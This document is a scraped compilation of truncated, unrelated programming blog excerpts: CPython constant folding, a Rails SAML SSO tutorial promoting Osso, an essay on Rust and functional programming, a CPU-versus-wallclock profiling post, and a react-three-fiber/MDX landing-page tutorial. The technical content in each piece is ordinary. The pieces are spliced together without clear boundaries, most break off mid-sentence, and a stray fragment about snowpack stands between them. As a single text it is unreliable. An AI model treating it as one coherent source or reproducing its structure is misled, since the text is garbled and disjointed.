<p><img src="https://user-images.githubusercontent.com/4745789/103898628-38922200-511b-11eb-965f-fb4d46d3c45c.png" alt="https://user-images.githubusercontent.com/4745789/103898628-38922200-511b-11eb-965f-fb4d46d3c45c.png"></p>
<p>The <code>astfold_expr</code> before folding the expression at hand, tries to fold its child expressions (operands) and then delegates the folding to the corresponding specific expression folding function. The operation-specific folding function evaluates the expression and returns the evaluated constant value, which is then put into the AST.</p>
<p>For example, whenever <code>astfold_expr</code> encounters a binary operation, it recursively folds the two child operands (expressions) before evaluating the expression at hand using <code>fold_binop</code>. The function <code>fold_binop</code> returns the evaluated constant value as seen in the snippet below.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/103898745-670ffd00-511b-11eb-88a9-f741157473b3.png" alt="https://user-images.githubusercontent.com/4745789/103898745-670ffd00-511b-11eb-88a9-f741157473b3.png"></p>
<p><code>fold_binop</code> function folds the binary operation by checking the kind of operator at hand and then invoking the corresponding evaluation function on them. For example, if the operation at hand is an addition then, to evaluate the final value, it invokes <code>PyNumber_Add</code> on both its left and right operands.</p>
<h3>What makes this elegant?</h3>
<p>Instead of writing special logic to handle certain patterns or types to fold constant expressions efficiently, CPython invokes the same general code. For example, it invokes the same usual <code>PyNumber_Add</code> function while folding that it does to perform the usual addition operation.</p>
<p>CPython has thus eradicated the need to write special functions to handle constant folding by making sure its code and evaluation process is structured in such a way that the general-purpose code itself can handle the evaluation of constant expressions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><img alt="rails saml abstract" src="https://d33wubrfki0l68.cloudfront.net/4e19e5a1a96df85fc6b0aedeb7ec10a2947d23e7/44b01/img/railssaml.jpg"><h3>SAML Background<a href="#saml-background" title="Direct link to heading">#</a></h3><p>SAML SSO refers to an authentication mechanism preferred by enterprise companies. The SSO part stands for Single Sign-On. From the enterprise’s perspective, they desire a centralized service where their employees can authenticate, which then provides authenticated access to the applications they use for work. These services are called Identity Providers (IDPs), and they are the <em>Single</em> place where enterprise employees <em>Sign-On.</em> This is an alternative to employees using password-based authentication for each of the various applications they use.</p><p>The SAML part stands for Secure Assertion Markup Language. SAML utilizes a domain-specific flavor of XML that describes an authenticated user, encoded to a string and passed to your application in a query parameter. Your application decodes the <code>SAMLResponse</code> using a key that the enterprise provides to you.</p><p>The details of the SAML Response are less important than understanding the general flow. When a user wants to sign in using SAML, you must send that user to their Identity Provider with a <code>SAMLRequest</code> that identifies your application. The user signs in to their IDP, and is redirected back to you with the <code>SAMLResponse</code>. What makes this a tiny bit complicated for a multi-tenant application is routing the user to the correct IDP, as SAML SSO breaks our common understanding of a login flow.</p><p>A typical login screen might have an email and password field, then a few buttons to sign in with OAuth services, like Google or GitHub. But now, you’ll need to gather something from the user who wants to sign in such that you can send them to the correct IDP instance.  We like to say that SAML is <em>instance based</em>, especially when <a href="https://ossoapp.com/blog/saml-vs-oauth">compared to OAuth</a>, which we can think of as <em>class based</em>. Domain is a common key for this process - you can ask a user for their email, grab the domain, and use that as a key to find the correct IDP instance and redirect the user.</p><h3>Let’s Build and Iterate<a href="#lets-build-and-iterate" title="Direct link to heading">#</a></h3><p>Once you wrap your head around understanding the SAML flow, it’s really not challenging to implement SAML in a Rails app - IDPs themselves offer great open source libraries to help with your integration. You can definitely get very far in a day or two. But like most things in engineering, the last 10% can take 90% of the effort, and while we all love to say “I could build that in a weekend,” we often later eat our words when we realize all of the edge cases, documentation needs, scaling challenges and unknown unknowns that make this or any other project worth doing a bit more involved than a quick weekend hack.</p><p>I’m a co-founder of an open source company Osso - our microservice is a Ruby and React app that allows you to onboard SAML SSO customers, generates custom documentation for each customer to perform their onboarding tasks in their IDP, and allows your Rails app to consume Osso using OAuth - we even provide <code>omniauth-osso</code> to make consuming an Osso instance from your Rails app incredibly simple.</p><p>Osso also offers paid plans, and you can skip right to our <a href="https://ossoapp.com/pricing">pricing page</a> to learn more about hosted Osso if you need SAML yesterday. Or you can jump right in to <a href="https://ossoapp.com/docs/deploy/overview">deploying an open source Osso instance</a> from our GitHub repo. There’s certainly the possibility of using <code>osso-rb</code> in your Rails app directly — you’ll want to mount our 3 rack based apps, pull in migrations, etc. — but this post will focus instead on a microservices approach.</p><p><strong>So</strong>, if you’d like to begin from first principles, follow along here as we build up a production-ready SAML SSO integration, starting with a single tenant approach, then layering in multi-tenancy. Once we have multi-tenant support, we’ll address questions about scalability and serviceability — how can we repeatedly add additional tenants, without spending significant engineering or customer support cycles? I <em>will</em> encourage you to use Osso, and show you exactly how, but will also highlight the things you need to be considering in order to roll out a production ready SAML integration <em>without</em> Osso.</p><p>We’ll use a single Rails app repository throughout this tutorial. The <a href="https://github.com/enterprise-oss/saml-rails" target="_blank" rel="noopener noreferrer">main branch</a> is a barebones Rails 6 app with Devise and a User model, and for each of our steps below we’ll move to a feature branch so we can see a full diff. Each step adds more functionality, getting you closer to a production-ready, multi-tenant integration. Each step also uses open source software, where the library used in the previous step is a dependency of the next step’s library. Neat!</p><p>We’ll also make use of Osso’s <a href="https://github.com/enterprise-oss/sinatra-ruby-idp" target="_blank" rel="noopener noreferrer">mock IDP</a> and <a href="https://demo.ossoapp.com/" target="_blank" rel="noopener noreferrer">demo instance</a>, especially when we get into multi-tenancy. You’ll still want to register with an IDP for a developer account in order to have access to an IDP for a second tenant - we recommend an <a href="https://developer.okta.com/signup/" target="_blank" rel="noopener noreferrer">Okta developer account</a>.</p><h3>Base Rails application<a href="#base-rails-application" title="Direct link to heading">#</a></h3><p>We’ll use the same Rails 6 application for each step - the source code is available [here] (<a href="https://github.com/enterprise-oss/saml-rails" target="_blank" rel="noopener noreferrer">https://github.com/enterprise-oss/saml-rails</a>). The <code>main</code> branch adds Devise with a User model to a brand new Rails app using Postgres as the database. The application doesn’t do anything - there is an index route and a logged in route that will tell you the email for the current user. This guide assumes proficiency with Rails, so it will skip some details. We’ll also use some intentionally naive approaches to demonstrate common challenges of SAML SSO. </p><h3>Single tenant<a href="#single-tenant" title="Direct link to heading">#</a></h3><h4>With ruby-saml and mock IDP<a href="#with-ruby-saml-and-mock-idp" title="Direct link to heading">#</a></h4><p>My first experience with SAML was working on <a href="https://medium.com/@tsharon/democratizing-ux-670b95fbc07f" target="_blank" rel="noopener noreferrer">internal software at WeWork</a> where one of my Osso co-founders was a teammate. The IT department required us to use SAML SSO, which I at first was awfully annoyed by. Google OAuth was super easy, and could be restricted to domain, so what’s the deal with this OneLogin thing? Fortunately, single-tenant SAML was just as simple to implement, and admittedly did include some better security. This is a common situation — an enterprise company requires SAML, and it might seem silly to you, but them’s the rules.</p><p>Our project was a Rails app, and we used a Ruby gem from OneLogin to handle the actual SAML encoding and decoding. Since we were building this app for WeWork employees, we had a single tenant, and didn’t need to worry about implementing a scalable solution for multiple tenants, documenting how to set SAML up for the app or training our teammates on how it worked. We also didn’t need to change our login form - we knew every user would be sent to the same IDP instance, so we were able to use a simple <em>Sign in With OneLogin</em> button.</p><p>That’s what we’ll do here, and if you’re building internal software this will be a fine approach for your production release! We’ll use Osso’s mock IDP for this single tenant to keep things simple too.</p><p>First lets install the ruby-saml gem. We’ll include it in our Gemfile and run <code>$ bundle install</code>.</p><p>We’ll use this library in two ways:</p><p>First, when a user wishes to sign in with SAML, we use ruby-saml to generate a url with a <code>SAMLRequest</code> - the URL is where we will send the user to sign in, and the <code>SAMLRequest</code> is sent along as a query param in order to identify our application to the IDP.</p><p>When the user signs in to their IDP, they will be sent back to your application with a <code>SAMLResponse</code> query param. We then use ruby-saml to decode and validate the <code>SAMLResponse</code>, allowing us to access information describing the user, such as their email address.</p><p>Lets define a couple of routes and controller actions to handle this flow.</p><p>In the <code>saml_login</code> action, we create a <code>OneLogin::RubySaml::Authrequest</code> and redirect to the return value. Later, in the callback, we validate and decode the response, and will sign the user in and redirect them if valid. Otherwise we’ll raise the validation errors to understand where our SAML config went wrong.</p><p>This callback route will also need to accept a POST request with <code>www-url-form-encoded</code> parameters, so you will need to skip the Rails <code>verify_authenticity_token</code> <code>before_action</code>:</p><div><p>app/controllers/application_controller.rb</p></div><p>Both of these actions depend on what ruby-saml calls <code>settings</code>. These values are created via the configuration you must perform between your application and the Identity Provider. In a real-world example, your application generates a few values which you provide to your customer. The customer uses these to configure your application in their IDP and returns some data generated by the IDP. We’ll discuss this process in more detail later. Since we are using the Osso Mock IDP we can mostly skip this configuration step, but it’s worth understanding what each of these values represents, how it functions and why it might prevent your user from signing in if misconfigured.</p><p>Each of the controller actions above calls a private method <code>saml_settings</code>. Since we are dealing with a single tenant, we will essentially hardcode the SAML configuration values to support this one IDP instance.</p><div><p>app/controllers/application_controller.rb</p></div><p><strong>Values you provide</strong></p><p><strong>ACS URL</strong> - The Assertion Consumer Service URL is where the IDP will send the user with a SAMLResponse when they log in. Similar to a Redirect URI in OAuth, your application will generate this value according to how your routes are set up.</p><p><strong>SP Entity ID</strong>  - Sometimes called the Audience URI, this is a unique identifier for the tenant in your application. This can get hairy! <strong>Google</strong> requires that they be unique for a customer, so you can't just use domain, while <strong>Azure</strong> won't let you use a UUID and <strong>Ping</strong> won't let you use a url. Those are just <em>some</em> of the edge cases we've found!</p><p><strong>Values the IDP provides</strong></p><p><strong>IDP SSO Target URL</strong> - The single sign on target URL tells your application where to send a user with a <code>SAMLRequest</code> in order to sign in.</p><p><strong>IDP Certificate</strong> - An x509 certificate which includes a public key that your application uses to encode and decode the SAML request and response.</p><p>Since we are using the Mock IDP, these values can be found in the Mock IDP’s federated metadata: <a href="https://github.com/enterprise-oss/sinatra-ruby-idp/blob/main/metadata.xml" target="_blank" rel="noopener noreferrer">https://github.com/enterprise-oss/sinatra-ruby-idp/blob/main/metadata.xml</a></p><p>To enforce good security practices, we put the certificate in Rails credentials. We won't show you our whole certificate here, but here's part of an …</p></section></div>

<p>Update: There was a delightful discussion about functional programming and the nature of Rust at <a href="https://lobste.rs/s/434bly/is_rust_functional_programming_language">lobste.rs</a>.
</p><div>
  <div>
    <blockquote>
<p>Functional languages take away mutability from the “mutability + aliasing = bugs” equation; Rust takes away the aliasing — or at least, the uncontrolled aliasing. To me, it then makes sense to feel comfortable using mutability (and the advantages it offers), safe in the knowledge that the compiler is helping you avoid bugs. [<a href="https://lobste.rs/s/434bly/is_rust_functional_programming_language#c_slxmwj">vfoley</a>]</p>
</blockquote>
<blockquote>
<p>I guess I don’t really agree with all of this. I agree that Rust gets the nice properties of functional languages at least when it comes to mutation, but if someone read the body of Rust code I have written and came back and said, “it really resembles the code I typically write on Lisp/ML/Haskell,” then I would be really surprised. I rarely write higher order functions. I rarely write recursive functions or folds. I rarely use persistent data structures and instead use mutation without reservation. [<a href="https://lobste.rs/s/434bly/is_rust_functional_programming_language#c_aucsix">burntsushi</a>]</p>
</blockquote>
<p><a href="https://lobste.rs/s/434bly/is_rust_functional_programming_language#c_zbcp7s">andyc</a> pointed to <a href="https://boats.gitlab.io/blog/post/notes-on-a-smaller-rust/">Notes on a smaller Rust
</a> and quoted:</p>
<blockquote>
<p>As I said once, pure functional programming is an ingenious trick to show you can code without mutation, but Rust is an even cleverer trick to show you can just have mutation.</p>
</blockquote>

  </div>
  <p><a href="">expand&nbsp;</a>
</p></div>

<hr>
<p>The book <a href="https://www.oreilly.com/library/view/programming-rust/9781491927274/">Programming Rust</a> introduces Rust as...</p>
<blockquote>
<p>not really an object-oriented language, although it has some object-oriented characteristics. Rust is not a functional language […] It’s probably best to reserve judgement about what sort of language Rust is, and see what you think once you’ve become comfortable with the language.</p>
</blockquote>
<p>Time for judgement has come! In the following I will lay out my view on how Rust’s language features influence programming style. I do agree with the aforementioned quote that Rust is not a single-paradigm language. Yet, the code written in idiomatic and safe Rust shares quite some similarities with code of functional programming languages.</p>
<p>“Functional programming language” is not a clearly defined term. From the various properties that are typically associated with functional programming I only want to focus on one: “Immutability” and referential transparency. Immutability means that data structures can be treated as values - once you have them, they will not change underneath you. If you want to express modification, you can construct a new data structure, maybe reusing (unchanged) parts of existing data. This enables referential transparency: If a function (or method) cannot change anything internally, its output only depends on its input. Given some input the function evaluation and the result it returns can be treated as the same. The function is said to be pure.</p>
<p>Immutability is often regarded as a very positive property:</p>
<ul>
<li>Pure code is deterministic and considered to be easier to reason about as the number of possible state combinations is limited.</li>
<li>If a function only depends on explicitly defined parameters, testing it is often easier.</li>
<li>Immutable data can be passed to concurrent code without worrying about synchron^izing access.</li>
<li>And it is free of cycles (unless you allow <a href="https://wiki.haskell.org/Tying_the_Knot">lazily evaluation</a>), making it easier to serialize and deserialize.</li>
</ul>
<p>Now Rust clearly allows for data to be mutable. Rust also does not provide <a href="https://en.wikipedia.org/wiki/Persistent_data_structure">persistent data structures</a> in its standard library (although there are <a href="https://crates.io/crates/im">third-party</a> <a href="https://crates.io/crates/rpds">options</a>) which are typically used to model immutable data efficiently. Yet, Rust’s rules around ownership require full control over what can be changed and when. To the extent that I have been working with Rust, a lot of it feels quite similar to programming Clojure from the point of view of designing programs.</p>
<h2 id="ownership-sharing-exclusivity">Ownership, sharing, exclusivity</h2>
<p>Each piece of data in (safe) Rust has exactly one owner. In the following example the variable <code>val</code> owns the String:</p>
<div><pre><code data-lang="rust"><span>let</span> val <span>=</span> <span>"Hello World"</span>.to_string();
</code></pre></div><p>Using <code>val</code> we can create references to the string:</p>
<div><pre><code data-lang="rust"><span>let</span> val_ref <span>=</span> <span>&amp;</span>val;
<span>// both val and val_ref can be used to read the string value:
</span><span></span>println<span>!</span>(<span>"{}"</span>, val);
println<span>!</span>(<span>"{}"</span>, val_ref);
</code></pre></div><p>However we cannot modify either <code>val</code> or <code>val_ref</code>:</p>
<div><pre><code data-lang="rust"><span>// cannot borrow `val` as mutable, as it is not declared as mutable
</span><span></span>val.push_str(<span>" World"</span>);

<span>// error: "cannot borrow `*val_ref` as mutable, as it is behind a `&amp;` reference"
</span><span></span>val_ref.push_str(<span>" World"</span>);
</code></pre></div><p>So in order to change <code>val</code> we need to declare it <code>mut</code>:</p>
<div><pre><code data-lang="rust"><span>let</span> <span>mut</span> val <span>=</span> <span>"Hello"</span>.to_string();
val.push_str(<span>" World"</span>); <span>// OK
</span></code></pre></div><p>But now we cannot take a reference at the same time anymore:</p>
<div><pre><code data-lang="rust"><span>let</span> <span>mut</span> val <span>=</span> <span>"Hello"</span>.to_string();
<span>// error: cannot borrow `val` as mutable because it is also borrowed as immutable
</span><span></span><span>let</span> val_ref <span>=</span> <span>&amp;</span>val;
val.push_str(<span>" World"</span>);
</code></pre></div><p>And similarly we can write to the reference if we declare it <code>mut</code> but then we cannot get another reference at the same time:</p>
<div><pre><code data-lang="rust"><span>let</span> <span>mut</span> val <span>=</span> <span>"Hello"</span>.to_string();
<span>let</span> val_ref <span>=</span> <span>&amp;</span>val;
<span>// error: cannot borrow `val` as mutable because it is also borrowed as immutable
</span><span></span><span>let</span> val_ref2 <span>=</span> <span>&amp;</span><span>mut</span> val;
</code></pre></div><p>This example demonstrates Rust’s ownership rules: We can get multiple shared (read-only) references to one piece of data but as soon as we indicate to modify the data by declaring either the owning variable or a reference as <code>mut</code> we cannot hold shared references at the same time. <code>mut</code> means first and foremost <em>exclusive</em> access to the underlying data (and only secondarily <em>mutable</em>).</p>
<p>Similarly, functions that want to modify parameters (or <em>self</em> in case of methods) need to indicate that they need exclusive access. This means that the caller can only use this function it has exclusive access to the parameters to be passed as <code>mut</code>:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>add_world</span>(val_ref: <span>&amp;</span><span>mut</span> String) {
    val_ref.push_str(<span>" World"</span>);
}
<span>// ...
</span><span></span>add_world(<span>&amp;</span><span>mut</span> val);
</code></pre></div><p>All this is to say: Mutability in Rust needs to be explicitly declared and the rules around exclusive access are statically enforced. A thing can only change if no one is looking — reducing the number of accidental state combinations and highlighting the parts of the code base that can introduce change clearly. A Rust function that only accepts shared references and owned values (that do not provide interior mutability) and that does not use unsafe code<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, is referentially transparent.</p>
<h2 id="interior-mutability">Interior mutability</h2>
<p>There are a number of use cases where not being able to modify shared references can become very limiting. For example consider this <a href="https://gtk-rs.org/">GTK+3</a> app:</p>


  <figure>
    <img src="https://robert.kra.hn/posts/2021-02-03_is-rust-fp/interior_mutability.gif"> 
  </figure>


<p>The implementation for this looks something like this:</p>
<div><pre><code data-lang="rust"><span>let</span> container <span>=</span> gtk::Box::new(gtk::Orientation::Vertical, <span>2</span>);
<span>// A label that will be modified
</span><span></span><span>let</span> label <span>=</span> gtk::Label::new(Some(<span>"Button not yet clicked"</span>));
<span>let</span> button <span>=</span> gtk::Button::with_label(<span>"Click me"</span>);
<span>// We clone label so we can send it into the closure.
</span><span></span><span>let</span> label_clone <span>=</span> label.clone();
button.connect_clicked(<span>move</span> <span>|</span>_<span>|</span> {
    label_clone.set_label(<span>"Button has been clicked!"</span>);
});
container.add(<span>&amp;</span>button);
container.add(<span>&amp;</span>label);
</code></pre></div><p>As you can see the <code>label</code> is added to the container so that it gets displayed <em>and</em> is bound inside the closure where it gets modified.</p>
<p>Rust uses two mechanisms in combination for that to work: The <a href="https://doc.rust-lang.org/book/ch15-05-interior-mutability.html#having-multiple-owners-of-mutable-data-by-combining-rct-and-refcellt"><code>Rc&lt;RefCell&lt;T&gt;&gt;</code> pattern</a><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. First, a reference counted pointer <code>std::rc::Rc</code> that is quite similar to C++’s <code>shared_ptr</code>. <code>Rc</code> takes ownership of another object. <code>Rc</code> implements <code>Clone</code> that will increase the ref count and hand out a new pointer. Those can be passed freely around. Inside of the ref-counted pointer a <a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html">RefCell</a> can be placed. It will allow to request exclusive access to the data owned. I.e. it will — at runtime! — produce a <code>mut</code> reference to the object wrapped and check that it is indeed not borrowed somewhere else. Should this not be the case, the borrow will fail (and possibly panic if <code>borrow_mut()</code> was used).</p>
<p>For more details about the internals of smart pointers and interior mutability I can highly highly recommend <a href="https://www.youtube.com/watch?v=8O0Nt9qY_vo">this screen cast by Jon Gjengset</a> that walks you through possible implementations of (among others) <code>Rc</code> and <code>RefCell</code>.</p>
<p>So Rust provides ways<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> around the statically enforced access rules that normally restrict modification of data. This provides enough abstractions to even implement an interface to an object-oriented system such as Glib / GTK+. Following that, you might argue that Rust is supporting multiple paradigms, and I will agree. Yet, similar to Clojure that provides “interior mutability”-equivalents like <a href="https://clojure.org/reference/atoms">atoms</a> I will point out that overly relying on those features is not considered idiomatic. In Clojure the best practice is to use atoms sparingly. Mostly at the outside of the app, extracting state that is passed into the inner layers of the app that will then transform the state immutably into a new derived version. Atoms then clearly highlight where state changes can be expected. In practice, this then provides a good compromise. In case of stateful bugs, you only have to have a limited amount of possible sources to check and possible combinations of state transitions are still limited to simplify reasoning.</p>
<p>The <code>Rc&lt;RefCell&lt;T&gt;&gt;</code> pattern is also not all that ergonomic. Yes, you can define type aliases like Glib does, Rust still makes it easier to not have nested, cyclic relationships between objects. To say it with book Programming Rust again (from the section “Taking Arms Against a Sea of Objects”):</p>
<blockquote>
<p>When everything depends on everything else like this, it’s hard to test, evolve, or even think about any component in isolation.
One fascinating thing about Rust is that the ownership model puts a speed bump on the highway to hell. […] It works unreasonably well: not only can Rust force you to understand why your program is thread-safe, it can even require some amount of high-level architectural design.</p>
</blockquote>
<p>And this is exactly the point I would like to convey with this article and the reason why I’m personally so fascinated with Rust: The set of features it does (not) provide are forcefully guiding the design of systems you build. This is quite contrary to how a lot of programming languages that attempt to provide a high degree of flexibility work (looking at you, Scala).</p>
<p>And then this is my claim: The ownership model, standard library, emphasize on iterators, and numerous other things do lead to code that is usually …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>The <a href="https://www.opsian.com/blog/what-is-profiling/">last post</a> in our <a href="https://www.opsian.com/blog/tags/profiling-in-production/">Profiling in Production series</a> we covered instrumentation and sampling profilers. We talked about “resources of interest” but which ones are the most useful for diagnosing performance bottlenecks? The most commonly used resource is time. We’ve been deliberately vague about the concept of timing so far because when it comes to computers there’s actually two types of timing.</p>
<p>The first is <em>CPU Time</em>. This is the time that your code actually spends executing code on the CPU. The other type of time that we’re interested in measuring is <em>Wallclock time</em>. Wallclock time is the total time between starting an operation and it completing.</p>
<p><img alt="A coffee shop at lunch time" src="https://www.opsian.com/images/profiling_in_production_series/coffee_shop.png" title="A coffee shop at lunch time"></p>
<p>The way that we like to think of the difference between the two types of profiling is that it's a bit like buying a coffee. If you go to any good coffee shop, or a Starbucks at lunchtime, then you'll find they tend to be pretty busy with a queue forming at the bar. In order to drink the delightful caffeinated beverage you desire you need to both get through the queue to be served and also have the barista make your coffee. CPU Time is the time that the barista spends making coffee - it's the actual time spent performing work. The Wallclock time is the total time it takes for you to get a coffee including waiting to be served.</p>
<p>Now you maybe wondering why CPU Time and Wallclock time aren’t the same number: after all your Java process doesn't have to wait in line at Starbucks. Code may not be running on a CPU for a variety of reasons. For example, it might be blocked on a lock, not scheduled on CPU due to too many threads running or have gone to sleep.</p>
<h4>So when should you use the different types of time?</h4>
<p><em>CPU Time</em> is more useful for problems where there are few threads showing high CPU usage, as many event-loop style applications do. You may see plenty of time being spent in other threads that are waiting around performing background work but aren't actually limiting the throughput of your application. So CPU Time is useful when you know you’re bottlenecked on processing capacity. This is often the case in applications where significant processing needs to happen for each request or event. Machine learning systems are a common example.</p>
<p><em>Wallclock Time</em> is useful for problems where CPU utilisation seems low but application throughput or latency doesn't meet expectations. This is because threads are probably blocked on something, for example multiple threads contenting on a lock, times when you're waiting for downstream network IO to happen or running with too many threads so some of them don't get scheduled. The trigger for looking at Wallclock time would be low CPU usage during your period of performance issues. This tends to happen in modern microservices deployments when services spend time blocked on other services - which limits overall throughput.</p>
<p>In summary, so far in this series we’ve learnt about the relative merits of instrumentation and sampling profilers and the most common timing types and where they should be used. In the next post we’re going to cover how sampling Java profilers specifically work and how to pick one that’s suitable for production.</p>

Instead of bundling our entire application and recompiling on every code change and save, snowpack only rebuilds single files where the changes have been made.

The library is a renderer for Three, using it we can skip a lot of mundane work such as scene creation and concentrate on composing our components in a declarative way with props and states.</p><p>The renderer allows us to use all of the Three classes, objects and properties as elements in our markup. All classes constructors arguments can be accessed via an <code>args</code> prop. A simple mesh with a box class can be seen below. Don't worry if you don't understand what this means, we will go over everything shortly.</p><pre><div><pre><p><span>&lt;</span><span>mesh</span><span> </span><span>visible</span><span> </span><span>position</span><span>=</span><span>{</span><span>[</span><span>1</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>3</span><span>]</span><span>}</span><span> </span><span>rotation</span><span>=</span><span>{</span><span>[</span><span>0</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>0</span><span>]</span><span>}</span><span>&gt;</span><span></span></p><p><span>  </span><span>&lt;</span><span>boxGeometry</span><span> </span><span>attach</span><span>=</span><span>"</span><span>geometry</span><span>"</span><span> </span><span>args</span><span>=</span><span>{</span><span>[</span><span>1</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>1</span><span>]</span><span>}</span><span> </span><span>/&gt;</span><span></span></p><p><span>  </span><span>&lt;</span><span>meshStandardMaterial</span><span> </span><span>attach</span><span>=</span><span>"</span><span>material</span><span>"</span><span> </span><span>color</span><span>=</span><span>"</span><span>red</span><span>"</span><span>/&gt;</span><span></span></p><p><span></span><span>&lt;/</span><span>mesh</span><span>&gt;</span></p></pre></div></pre><p>MDX</p><p>Our page will be rendered in <span><a target="_blank" rel="noopener noreferrer" href="https://mdxjs.com/">MDX</a></span>, a format which allows us to write JSX and include React components in markdown files. It's a wonderful development experience and one I hope you will fall in love with once we reach the end of the tutorial.</p><p>Install the fun</p><p>I have created a handy snowpack template that creates a project with snowpack, chakra and MDX all installed. It also comes with React Router v6 but we wont be using that so will remove that boilerplate.</p><p>Open a new terminal and navigate to your desired project folder and run the following which will create our new project. Change <code>my-new-app</code> to your apps name.</p><pre><div><pre><p><span>npx create-snowpack-app my-new-app --template snowpack-mdx-chakra</span></p></pre></div></pre><p>Next we can install our projects dependencies.</p><pre><div><pre><p><span>npm</span><span> i @chakra-ui/react @emotion/react @emotion/styled framer-motion react-three-fiber three @react-three/drei react-particles-js</span></p></pre></div></pre><p>Now that we have our dependencies installed we can begin to tear out some of the stuff we wont need. Our landing page will encompass a single page so we can open the <code>mdx-routes.js</code> file and remove the <code>Nav</code> component and the page-two route from the <code>MDXRoutes</code> component. We'll return to this file later to add some styling but for now we can move on.</p><p>Inside the pages folder delete page-two and remove the contents from page-one. Inside the components folder delete the emoji component and add a new folder called 3d. And that's it, we are now ready to begin coding some sick 3D landing page goodness!</p><p>The layout</p><p>Open the <code>mdx-layout.js</code> file located in the components folder. This will wrap our whole app, in our case our one landing page. Our page will consist of a css grid, we'll use grid areas to get a nice visual representation of how our page will layout. Remove what is currently in there and add the following.</p><pre><div><pre><p><span>import</span><span> React </span><span>from</span><span> </span><span>'react'</span><span>;</span><span></span></p><p><span></span><span>import</span><span> </span><span>{</span><span> Flex</span><span>,</span><span> Grid </span><span>}</span><span> </span><span>from</span><span> </span><span>'@chakra-ui/react'</span><span>;</span><span></span></p><p><span></span><span>const</span><span> desktop </span><span>=</span><span> </span><span>`</span><span></span></p><p><span>'edge   .       .         .'</span></p><p><span>'edge   text    product   .'</span></p><p><span></span><span>`</span><span>;</span><span></span></p><p><span></span><span>const</span><span> </span><span>MDXLayout</span><span> </span><span>=</span><span> </span><span>(</span><span>{</span><span> children </span><span>}</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>    </span><span>&lt;</span><span>Grid</span><span></span></p><p><span>      </span><span>templateColumns</span><span>=</span><span>"</span><span>10% 1fr 1fr 10%</span><span>"</span><span></span></p><p><span>      </span><span>templateRows</span><span>=</span><span>"</span><span>10% 1fr 1fr</span><span>"</span><span></span></p><p><span>      </span><span>templateAreas</span><span>=</span><span>{</span><span>desktop</span><span>}</span><span></span></p><p><span>      </span><span>bg</span><span>=</span><span>"</span><span>brand.background</span><span>"</span><span></span></p><p><span>      </span><span>h</span><span>=</span><span>"</span><span>100vh</span><span>"</span><span></span></p><p><span>    </span><span>&gt;</span><span></span></p><p><span>      </span><span>{</span><span>children</span><span>}</span><span></span></p><p><span>    </span><span>&lt;/</span><span>Grid</span><span>&gt;</span><span></span></p><p><span>  </span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span>;</span><span></span></p><p><span></span><span>export</span><span> </span><span>default</span><span> MDXLayout</span><span>;</span></p></pre></div></pre><p>Using Chakras Grid component we set the amount of columns to have a responsive padding of 10% of the viewport width on each side of two flexible one fractional units of space. This basically means that the meat of our page will live in the two fractional columns, with each taking up as much space as they need before they hit the 10% padding on each side. Our rows follow the same logic except we save 10% for our header row and the rest takes up as much space as needed. As you can see, we have a background color set on the bg (background) prop. But where does that value come from and what does it mean?</p><p>Open the <code>theme.js</code> file located in the <code>src</code> folder. This is our global theme for our app. We are importing the default theme from Chakra, which itself uses the Tailwind default preset. We are then overriding the colors with our own brand colors. The font sizes are also being overridden to allow us to use slightly different sizes to the default. Go ahead and copy the following colors object into the file instead of the current one.</p><pre><div><pre><p><span>colors: </span><span>{</span><span></span></p><p><span>    </span><span>..</span><span>.theme.colors,</span></p><p><span>    brand: </span><span>{</span><span></span></p><p><span>      red: </span><span>'#ed1c24'</span><span>,</span></p><p><span>      lightGrey: </span><span>'#D6D6D6'</span><span>,</span></p><p><span>      background: </span><span>'#090d12'</span><span>,</span></p><p><span>      text: </span><span>'#FFFfff'</span><span>,</span></p><p><span>    </span><span>}</span><span>,</span></p><p><span>  </span><span>}</span><span>,</span></p></pre></div></pre><p>Components in MDX</p><p>MDX is just markdown that you can write JSX in. So that means that we can write normal markdown like so:</p><pre></pre><p>But we can also add to that React components We can even compose React components right in the MDX file! Let's open up the <code>index.js</code> file in the <code>src</code> folder and check out how we can add components to our MDX file without using imports.</p><p>Let's break down what's going on in here. If we scroll to the bottom we can see an <code>MDXProvider</code> wrapping our app. It accepts a components prop into which we have passed a components object declared above. The components object allows us to map React components to markdown elements as well as passing in custom components for use in our MDX files. As you can see, this template has set this all up for us by mapping some basic markdown elements to some Chakra components. Where there is no object key we have passed in a custom component which can be used in the MDX file without importing it as you would in a normal js or jsx file.</p><p>MDX accepts a special key called <code>wrapper</code> which will wrap the entire file with whatever is passed to it. In our case it will take our previously created layout component along with it's grid and use that to wrap our MDX file. Now that we know where the components are coming from when using them in our MDX file, let's go ahead and write some React in markdown!</p><p>The header</p><p>Opening up the <code>page-one.mdx</code> file located in the pages folder, add the following.</p><pre><div><pre><p><span>&lt;</span><span>Flex</span><span> </span><span>gridArea</span><span>=</span><span>"</span><span>edge</span><span>"</span><span> </span><span>gridRow</span><span>=</span><span>"</span><span>1</span><span>"</span><span> </span><span>justify</span><span>=</span><span>"</span><span>center</span><span>"</span><span> </span><span>align</span><span>=</span><span>"</span><span>center</span><span>"</span><span> </span><span>ml</span><span>=</span><span>{6}</span><span> </span><span>as</span><span>=</span><span>"</span><span>header</span><span>"</span><span>&gt;</span><span></span></p><p><span>  </span><span>&lt;</span><span>Image</span><span></span></p><p><span>    </span><span>w</span><span>=</span><span>"</span><span>100px</span><span>"</span><span></span></p><p><span>    </span><span>src</span><span>=</span><span>"</span><span>https://www.transparentpng.com/thumb/nike-logo/Blc12i-red-nike-logo-clipart-png-photos.png</span><span>"</span><span></span></p><p><span>    </span><span>alt</span><span>=</span><span>"</span><span>Red Nike Swoosh Logo</span><span>"</span><span></span></p><p><span>  